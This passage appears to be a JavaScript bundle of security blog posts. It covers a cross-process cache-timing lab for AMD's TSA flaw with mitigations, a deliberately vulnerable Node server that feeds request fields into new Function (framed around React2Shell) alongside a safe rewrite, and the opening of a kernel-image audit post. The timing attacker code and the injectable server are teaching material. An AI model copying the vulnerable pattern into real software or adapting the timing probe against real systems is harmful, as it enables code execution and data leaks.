<p>To make the lab feel more like a <strong>cross-process leak</strong> (closer to TSA’s “other context” threat model), you can separate victim and attacker into <strong>two processes</strong> that share memory via <code>shm_open</code> / <code>mmap</code>.</p>
<p><strong>Shared header:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// common.h</span>
<span class="pl-k">#pragma</span> once
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> {
    <span class="pl-smi">uint8_t</span> <span class="pl-c1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">stop</span>;      <span class="pl-c">// flag to tell victim to stop</span>
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">ready</span>;     <span class="pl-c">// flag for simple sync</span>
};</pre></div>
<p><strong>Victim process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// victim.c</span>
<span class="pl-c">// gcc -O2 -march=native -o victim victim.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>

<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x7F</span>;

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span> | <span class="pl-c1">O_CREAT</span>, <span class="pl-c1">0600</span>);
    <span class="pl-en">ftruncate</span>(<span class="pl-s1">fd</span>, <span class="pl-k">sizeof</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span>));
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Initialize</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span>) {
        <span class="pl-c">// attacker_hint could be communicated via shared memory too;</span>
        <span class="pl-c">// here we just fix it for simplicity</span>
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x11</span>;
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;
        <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;
        __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
    }

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p><strong>Attacker process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// attacker.c</span>
<span class="pl-c">// gcc -O2 -march=native -o attacker attacker.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-smi">uint32_t</span> <span class="pl-en">time_access</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span>, <span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-smi">unsigned</span> <span class="pl-s1">aux</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    <span class="pl-k">return</span> (<span class="pl-smi">uint32_t</span>)(<span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>);
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span>, <span class="pl-c1">0600</span>);
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Wait for victim to init</span>
    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span>) { }

    <span class="pl-c">// Flush cache lines first</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }

    <span class="pl-c">// Give victim some time to run and "prime" one line</span>
    <span class="pl-en">usleep</span>(<span class="pl-c1">10000</span>);

    <span class="pl-smi">uint32_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint32_t</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-en">time_access</span>(<span class="pl-s1">sh</span>, <span class="pl-s1">idx</span>);
        <span class="pl-k">if</span> (<span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">t</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index (cross-proc) = %d, time = %u cycles\\n"</span>,
           <span class="pl-s1">best_idx</span>, <span class="pl-s1">best_time</span>);

    <span class="pl-c">// Tell victim to stop</span>
    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>This is closer in spirit to <strong>“victim in one context, attacker in another”</strong>, even though they’re still on the same OS and sharing memory explicitly. Real TSA removes that explicit sharing: instead of a shared array, the “shared state” is the CPU’s internal scheduler, store queue, and L1 cache.</p>
<div class="markdown-heading"><h3 class="heading-element">4.4 Connecting the lab back to TSA</h3><a id="user-content-44-connecting-the-lab-back-to-tsa" class="anchor" aria-label="Permalink: 4.4 Connecting the lab back to TSA" href="#44-connecting-the-lab-back-to-tsa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Right after these code sections, the key takeaway is:</p>
<ul>
<li>
<p>Our toy lab uses <strong>cache presence</strong> as the side-channel signal (classic Flush+Reload / Prime+Probe).</p>
</li>
<li>
<p>TSA uses <strong>scheduler timing</strong> as the side-channel signal:</p>
<ul>
<li>False completions → invalid data forwarded → different dependency chains → different timing.</li>
</ul>
</li>
<li>
<p>In both cases, the attacker:</p>
<ol>
<li>
<strong>Influences</strong> microarchitectural state (priming),</li>
<li>Lets a victim touch secret-dependent data (access pattern),</li>
<li>Measures a <strong>timing difference</strong> in its own code,</li>
<li>Reconstructs bits of the secret over many trials.</li>
</ol>
</li>
</ul>
<p>That’s the mental bridge you want readers to cross.</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">5. Mitigations: what AMD, OSs, and clouds are doing</h2><a id="user-content-5-mitigations-what-amd-oss-and-clouds-are-doing" class="anchor" aria-label="Permalink: 5. Mitigations: what AMD, OSs, and clouds are doing" href="#5-mitigations-what-amd-oss-and-clouds-are-doing"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA mitigations span firmware, OS, and virtualization layers.</p>
<div class="markdown-heading"><h3 class="heading-element">5.1 Microcode + VERW</h3><a id="user-content-51-microcode--verw" class="anchor" aria-label="Permalink: 5.1 Microcode + VERW" href="#51-microcode--verw"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD ships updated <strong>microcode</strong> for vulnerable Family 19h CPUs. On top of that, they recommend using the memory form of the <code>VERW</code> instruction as a “microarchitectural scrub”:</p>
<ul>
<li>New CPUID bits tell software:
<ul>
<li>Whether TSA-L1 / TSA-SQ are not present,</li>
<li>Whether the CPU supports TSA mitigation via <code>VERW_CLEAR</code>.</li>
</ul>
</li>
<li>With appropriate microcode loaded, <strong>CPL0 (kernel / hypervisor)</strong> can execute <code>VERW</code> to clear TSA-relevant structures when crossing trust boundaries, e.g.:
<ul>
<li>Kernel → user transitions,</li>
<li>Hypervisor → guest VM transitions,</li>
<li>Before entering low-power states.</li>
</ul>
</li>
</ul>
<p>This is similar in spirit to existing post-Spectre mitigations (IBPB, STIBP, etc.) but targeted at scheduler structures.</p>
<div class="markdown-heading"><h3 class="heading-element">5.2 Linux <code>MITIGATION_TSA</code> and <code>tsa=</code> knob</h3><a id="user-content-52-linux-mitigation_tsa-and-tsa-knob" class="anchor" aria-label="Permalink: 5.2 Linux MITIGATION_TSA and tsa= knob" href="#52-linux-mitigation_tsa-and-tsa-knob"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Linux added explicit support for TSA mitigations:</p>
<ul>
<li>A new Kconfig option <code>MITIGATION_TSA</code> gates TSA-related logic.</li>
<li>A boot parameter <code>tsa=</code> controls behavior (e.g., always on, only for user/kernel transitions, only guest/host transitions, or disabled).</li>
<li>Combined with updated microcode from <code>linux-firmware</code>, this lets distros tune performance vs security trade-offs depending on threat model.</li>
</ul>
<div class="markdown-heading"><h3 class="heading-element">5.3 SEV-SNP and attestation</h3><a id="user-content-53-sev-snp-and-attestation" class="anchor" aria-label="Permalink: 5.3 SEV-SNP and attestation" href="#53-sev-snp-and-attestation"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>For AMD’s <strong>SEV-SNP</strong> (encrypted VM) environments:</p>
<ul>
<li>TSA could, in principle, allow a malicious hypervisor to infer SEV-SNP guest data.</li>
<li>Microcode and firmware updates aim to automatically mitigate TSA for SEV-SNP guests.</li>
<li>Guest owners are expected to:
<ul>
<li>Verify via <strong>attestation</strong> that the host is running the right microcode,</li>
<li>Confirm that TSA mitigations are active before trusting the platform.</li>
</ul>
</li>
</ul>
<hr>
<div class="markdown-heading"><h2 class="heading-element">6. What red teams and blue teams should actually do</h2><a id="user-content-6-what-red-teams-and-blue-teams-should-actually-do" class="anchor" aria-label="Permalink: 6. What red teams and blue teams should actually do" href="#6-what-red-teams-and-blue-teams-should-actually-do"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<div class="markdown-heading"><h3 class="heading-element">6.1 For red teams</h3><a id="user-content-61-for-red-teams" class="anchor" aria-label="Permalink: 6.1 For red teams" href="#61-for-red-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA probably won’t be your <strong>first</strong> move in a real engagement, but it’s worth understanding as part of a modern attack surface:</p>
<ul>
<li>
<strong>Model it as a capability</strong>:
<ul>
<li>“Given local code execution on a shared AMD Zen 3/4 host, I may be able to leak bits of privileged data over time.”</li>
</ul>
</li>
<li>
<strong>Think in campaigns, not single shots</strong>:
<ul>
<li>Meeting the timing conditions and noise requirements means you want long-lived footholds and repeated victim activity.</li>
</ul>
</li>
<li>
<strong>Use it to stress test cloud models</strong>:
<ul>
<li>Ask: “If I’m a rogue tenant on this EPYC host, what’s the maximum <em>theoretical</em> data I can extract from neighbors?”</li>
</ul>
</li>
</ul>
<p>TSA is a great hook for talks and blogs because it forces teams to think beyond “network perimeter” and even beyond “syscall boundary.” The CPU itself is part of the threat surface.</p>
<div class="markdown-heading"><h3 class="heading-element">6.2 For blue teams</h3><a id="user-content-62-for-blue-teams" class="anchor" aria-label="Permalink: 6.2 For blue teams" href="#62-for-blue-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Concrete actions:</p>
<ol>
<li>
<p><strong>Patch like this is Meltdown-class, not just ‘medium CVSS’</strong></p>
<ul>
<li>Make sure:
<ul>
<li>Firmware/microcode is up to date for all Family 19h platforms,</li>
<li>OS / hypervisor builds include TSA mitigations and have <code>tsa=</code> configured appropriately.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Re-evaluate your multi-tenant risk</strong></p>
<ul>
<li>In clouds and shared hosting:
<ul>
<li>Understand which SKUs are affected,</li>
<li>Decide whether you treat TSA as an academic curiosity or something you must mitigate for specific tenants (e.g., high-sensitivity workloads).</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Include TSA in your threat modeling</strong></p>
<ul>
<li>It’s an <strong>info-leak primitive</strong>, not an RCE.</li>
<li>Combine it mentally with other bugs:
<ul>
<li>RCE → TSA → secret exfiltration → crypto break → lateral movement.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Watch for performance regressions</strong></p>
<ul>
<li>VERW-based mitigations may hurt performance; you’ll need to benchmark and possibly make different choices per environment (internal dev vs multi-tenant cloud vs regulated workloads).</li>
</ul>
</li>
</ol>
<hr>
`,ay=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server</h1>
    <blockquote>
      <p>"Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation." — OWASP</p>
    </blockquote>
    <p>CVE-2025-55182 ("React2Shell") pushed insecure deserialization back into the spotlight:</p>
    <ul>
      <li>It’s a CVSS 10.0 RCE in <strong>React Server Components</strong> (RSC).</li>
      <li>The bug lives in the <strong>Flight protocol</strong> used by RSC: attacker-controlled data is <strong>deserialized unsafely</strong>, letting crafted objects influence server-side execution and achieve code execution on the Node.js server.</li>
    </ul>
    <p>You absolutely shouldn’t be testing real React2Shell payloads against anything but an isolated lab. But you <em>can</em> understand the core pattern with a <strong>tiny, self-contained Node.js example</strong> that mimics the same <em>class</em> of bug: deserialization of untrusted data → treating it as special internal objects → executing attacker-controlled behavior.</p>
    <p>This post walks through:</p>
    <ul>
      <li>A quick refresher on insecure deserialization.</li>
      <li>A <strong>toy "fake Flight" server</strong> in Node/Express that’s intentionally vulnerable.</li>
      <li>A harmless "payload" that only evaluates math.</li>
      <li>A safer version of the same endpoint.</li>
      <li>How this maps conceptually to real-world bugs like React2Shell.</li>
    </ul>
    <hr />
    <h2>1. Insecure deserialization in one paragraph</h2>
    <p>Insecure deserialization is when an application takes <strong>untrusted data</strong>, deserializes it into objects, and then uses those objects in ways that let an attacker:</p>
    <ul>
      <li>Manipulate logic,</li>
      <li>Abuse "magic" methods or callbacks,</li>
      <li>Or even <strong>execute arbitrary code</strong>.</li>
    </ul>
    <p>That’s why it shows up in the OWASP Top 10 and is treated as a high-risk category: unsafe deserialization logic can be a straight path to RCE.</p>
    <p>React2Shell is a modern instance of this: the server <strong>deserializes Flight payloads</strong> and interprets them as internal “Chunk” objects. Because that deserialization didn’t sufficiently validate or constrain what those objects could look like, attackers found a way to make React resolve <em>fake</em> chunks and end up running arbitrary JavaScript on the server.</p>
    <p>Let’s recreate that <em>pattern</em> in a tiny Node app.</p>
    <hr />
    <h2>2. A tiny "fake Flight" server (intentionally vulnerable)</h2>
    <p>We’ll build a Node/Express server that:</p>
    <ul>
      <li>Accepts a JSON payload that looks like a "slot map" (<code>"0"</code>, <code>"1"</code>, etc.).</li>
      <li>Pulls out slot <code>"1"</code> as a <strong>"chunk"</strong>.</li>
      <li>Treats any chunk with a <code>then</code> field as special.</li>
      <li>Calls a handler based on <code>chunk.then</code>.</li>
      <li>Uses <code>chunk._expr</code> inside <code>new Function()</code>.</li>
    </ul>
    <p>This is obviously unsafe; that’s the point. It’s a simplified version of the larger deserialization &amp; "thenable" handling patterns described in real-world React2Shell writeups.</p>
    <h3>2.1 Setup</h3>
    <pre><code class="language-bash">mkdir fake-flight-lab
cd fake-flight-lab
npm init -y
npm install express body-parser</code></pre>
    <h3>2.2 Vulnerable server (<code>server-vuln.js</code>)</h3>
    <pre><code class="language-javascript">const express = require("express");
const bodyParser = require("body-parser");

const app = express();
app.use(bodyParser.json());

// --- Fake "chunk" resolver (vulnerable) ---

// Very naive "promise-like" resolver: if an object has a \`then\` field,
// we treat it as something that needs to be "resolved" via a handler.
const thenHandlers = {
  // Our "legit" handler; mapping is attacker-controllable in this toy
  logAndEval: function (chunk, response) {
    console.log("[*] logAndEval called with chunk:", chunk);

    // Attacker-controlled field:
    const expr = chunk._expr;

    // VULNERABLE: directly compile and run attacker-controlled string.
    // In real bugs, this might be an internal expression or dynamic call.
    const fn = new Function(\`return (\${expr});\`);

    const result = fn();
    response.value = result;
  },
};

// Fake "Flight" endpoint
app.post("/fake-flight", (req, res) => {
  const payload = req.body;

  console.log("[*] Received payload:", JSON.stringify(payload, null, 2));

  // Pick slot "1" as our main "chunk"
  const chunk = payload["1"];
  const response = { value: null };

  try {
    // VULN #1: trust that whatever is in \`chunk.then\` is a valid handler name
    const handlerName = chunk.then;

    // VULN #2: look it up dynamically without validation
    const handler = thenHandlers[handlerName];

    if (typeof handler !== "function") {
      throw new Error("No such handler");
    }

    // Call the handler with the (attacker-controlled) chunk
    handler(chunk, response);

    // Serialize the result
    res.json({
      ok: true,
      result: response.value,
    });
  } catch (e) {
    console.error("[!] Error while processing fake-flight payload:", e);
    res.status(500).json({ ok: false, error: e.message });
  }
});

app.listen(3000, () => {
  console.log("VULN fake-flight server listening on http://localhost:3000");
});</code></pre>
    <p>What’s insecure here:</p>
    <ul>
      <li>We treat any object with <code>.then</code> as special and use that field to <strong>control which function runs</strong>.</li>
      <li>We take a string from <code>_expr</code> and feed it straight into <code>new Function</code> → arbitrary code path inside the Node process. This mirrors how insecure deserialization can escalate into code execution in real apps.</li>
    </ul>
    <hr />
    <h2>3. A harmless "malicious" payload (just math)</h2>
    <p>Start the server:</p>
    <pre><code class="language-bash">node server-vuln.js</code></pre>
    <p>Now send a JSON payload that looks suspiciously like a "chunk":</p>
    <pre><code class="language-bash">curl -X POST http://localhost:3000/fake-flight   -H "Content-Type: application/json"   -d '{
    "0": "meta",
    "1": {
      "status": "resolved_model",
      "_expr": "1 + 2 + 3 * 4",
      "then": "logAndEval"
    }
  }'</code></pre>
    <p>What happens:</p>
    <ol>
      <li>The server reads <code>payload["1"]</code> into <code>chunk</code>.</li>
      <li>It sees <code>chunk.then === "logAndEval"</code> and calls <code>thenHandlers.logAndEval(chunk, response)</code>.</li>
      <li><code>logAndEval</code> pulls <code>chunk._expr</code> (<code>"1 + 2 + 3 * 4"</code>).</li>
      <li>It builds <code>new Function("return (" + expr + ");")</code> → <code>new Function("return (1 + 2 + 3 * 4);")</code>.</li>
      <li>Executes it and returns:</li>
    </ol>
    <pre><code class="language-json">{
  "ok": true,
  "result": 15
}</code></pre>
    <p>This is benign — we only evaluated a math expression — but structurally we’ve reproduced the core pattern:</p>
    <ul>
      <li><strong>Attacker controls object fields</strong> (<code>then</code>, <code>_expr</code>) in the deserialized payload.</li>
      <li>The server uses those fields to <strong>drive control flow</strong> (which handler to run) and <strong>compose code to execute</strong>.</li>
    </ul>
    <p>That’s exactly the kind of chain OWASP warns about: untrusted data being deserialized and then used to manipulate object attributes or insert new ones, leading to logic abuse or code execution.</p>
    <hr />
    <h2>4. Fixing the toy: structured data, no <code>new Function</code></h2>
    <p>Now let’s add a <strong>safe</strong> variant of the same endpoint, so you can see what “good” looks like in contrast.</p>
    <h3>4.1 Safer handler</h3>
    <p>Add this to the same file (or a new one):</p>
    <pre><code class="language-javascript">// --- Safer variant: explicit, whitelisted operations only ---

const SAFE_OPS = new Set(["add", "mul"]);

function safeEvalExpression(op, a, b) {
  if (!SAFE_OPS.has(op)) {
    throw new Error("Unsupported op");
  }
  a = Number(a);
  b = Number(b);
  if (Number.isNaN(a) || Number.isNaN(b)) {
    throw new Error("Invalid numbers");
  }
  return op === "add" ? a + b : a * b;
}

app.post("/fake-flight-safe", (req, res) => {
  const payload = req.body;
  const chunk = payload["1"];
  const response = { value: null };

  try {
    // Validate structure explicitly
    if (!chunk || chunk.status !== "resolved_model") {
      throw new Error("bad status");
    }

    const { op, a, b } = chunk;

    const result = safeEvalExpression(op, a, b);
    response.value = result;

    res.json({ ok: true, result: response.value });
  } catch (e) {
    console.error("[!] Error in safe endpoint:", e);
    res.status(400).json({ ok: false, error: e.message });
  }
});</code></pre>
    <p>Now call:</p>
    <pre><code class="language-bash">curl -X POST http://localhost:3000/fake-flight-safe   -H "Content-Type: application/json"   -d '{
    "1": {
      "status": "resolved_model",
      "op": "add",
      "a": 10,
      "b": 20
    }
  }'</code></pre>
    <p>You should see:</p>
    <pre><code class="language-json">{
  "ok": true,
  "result": 30
}</code></pre>
    <p>Here we:</p>
    <ul>
      <li><strong>Don’t</strong> treat <code>then</code> as a magic field.</li>
      <li><strong>Don’t</strong> run arbitrary expressions.</li>
      <li><strong>Do</strong>:
        <ul>
          <li>Validate fields,</li>
          <li>Constrain operations to a whitelist,</li>
          <li>Coerce types.</li>
        </ul>
      </li>
    </ul>
    <p>This matches common guidance on safe deserialization: define a strict schema, validate all fields, and never deserialize directly into objects with behavior (callbacks, dynamic code) that can be triggered by untrusted data.</p>
    <hr />
    <h2>5. Mapping this toy back to React2Shell</h2>
    <p>Real-world CVE-2025-55182 is obviously more complex, but the <em>shape</em> of the bug is similar:</p>
    <ul>
      <li>RSC has a <strong>Flight protocol</strong> with a structured payload (slots, references, status codes).</li>
      <li>The server <strong>deserializes</strong> that payload into internal “Chunks”.</li>
      <li>Those chunks are treated like promise-like objects and resolved using their <code>then</code> and related fields.</li>
      <li>Because the code did not sufficiently validate or lock down the structure, <strong>attacker-supplied objects</strong> can be interpreted as internal chunks, and their fields end up influencing internal callbacks and state — eventually leading to arbitrary JS execution in the Node process.</li>
    </ul>
    <p>Security writeups on React2Shell repeatedly describe it as an <strong>unsafe / insecure deserialization flaw in the Flight protocol</strong>: untrusted data, parsed into internal structures, used to control resolution logic and server-side behavior.</p>
    <p>This toy example gives you a mental model to read those writeups:</p>
    <ul>
      <li>Anywhere you see “fake Chunk objects”, think: <em>our <code>chunk</code> object with attacker-controlled fields</em>.</li>
      <li>Anywhere you see “thenable abused”, think: <em>our <code>chunk.then</code> controlling which function runs</em>.</li>
      <li>Anywhere you see “code injected into internal expression”, think: <em>our <code>_expr</code> string passed into <code>new Function()</code></em>.</li>
    </ul>
    <hr />
    <h2>6. Takeaways for your own code</h2>
    <p>Whether or not you ever touch React Server Components, this pattern shows up everywhere:</p>
    <ul>
      <li>JSON / binary payloads mapped into "magic" objects.</li>
      <li>ORMs or serializers that hydrate classes with methods and hooks.</li>
      <li>Message formats that allow callbacks or special fields (<code>__proto__</code>, <code>then</code>, <code>_onLoad</code>, etc.).</li>
    </ul>
    <p>To avoid ending up in the same situation:</p>
    <ol>
      <li><strong>Don’t deserialize untrusted data into rich objects with behavior.</strong><br />Deserialize into plain data structures and validate them first.</li>
      <li><strong>Treat protocol fields like code, not just data.</strong><br />Anything that controls which function gets called (<code>then</code>, <code>type</code>, <code>handler</code>) needs strict allowlists.</li>
      <li><strong>Never <code>eval</code> / <code>new Function</code> on data from the network.</strong><br />If you really must interpret expressions, constrain them to a safe DSL and sandbox heavily.</li>
      <li><strong>For complex protocols (like Flight), write fuzzers and negative tests.</strong><br />When you see a deserializer that:
        <ul>
          <li>Builds graphs of objects,</li>
          <li>Treats some fields specially,</li>
          <li>Traverses prototypes / thenables…<br />…that’s a huge red flag and deserves targeted testing.</li>
        </ul>
      </li>
    </ol>
  </div>
</body>
</html>
`,ly=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>Who Can Touch Your Kernel? Auditing <code>/boot/vmlinuz-*</code> on Linux</h1>
    <p>When we talk about “protecting a Linux system,” most people think of:</p>
    <ul>
      <li>Patching services</li>
      <li>Hardening SSH</li>
      <li>Watching logs</li>
    </ul>
    <p>Almost nobody starts with the question:</p>
    <blockquote>
      <p><strong>“Who can modify my kernel image?”</strong></p>
    </blockquote>
    <p>On a typical Linux machine, that kernel image lives in files like:</p>
    <pre><code class="language-bash">/boot/vmlinuz-6.8.0-35-generic
/boot/vmlinuz-5.15.0-91-generic</code></pre>
    <p>These are not just random binaries. They <em>are</em> the operating system’s core. If an attacker can silently replace them, everything above the kernel—processes, containers, even security tools—runs on top of a compromised foundation.</p>
    <p>In this post, we’ll explore:</p>
    <ul>
      <li>What <code>/boot/vmlinuz-*</code> actually is</li>
      <li>Which code <strong>must</strong> be allowed to modify it</li>
      <li>Which code <strong>shouldn’t</strong> but still technically can</li>
      <li>How to start <strong>detecting risky conditions</strong> with a detailed Python audit script</li>
    </ul>
    <p>All from a defensive, “threat-model my own box” point of view.</p>
    <hr />
    <h2>1. What lives in <code>/boot/vmlinuz-*</code>?</h2>
    <p>On most distros, you’ll see files like:</p>
    <pre><code class="language-bash">ls -l /boot/vmlinuz-*
-rw------- 1 root root 12345678 May  1 10:00 /boot/vmlinuz-6.8.0-35-generic
-rw------- 1 root root 11765432 Mar 10 09:21 /boot/vmlinuz-5.15.0-91-generic</code></pre>
    <p>Those <code>vmlinuz-*</code> files are:</p>
    <ul>
      <li>The <strong>compressed Linux kernel images</strong></li>
      <li>Loaded by the bootloader (GRUB, systemd-boot, etc.) at boot</li>
      <li>Executed in <strong>ring 0</strong>, the most privileged CPU mode</li>
    </ul>
    <p>During boot:</p>
    <ol>
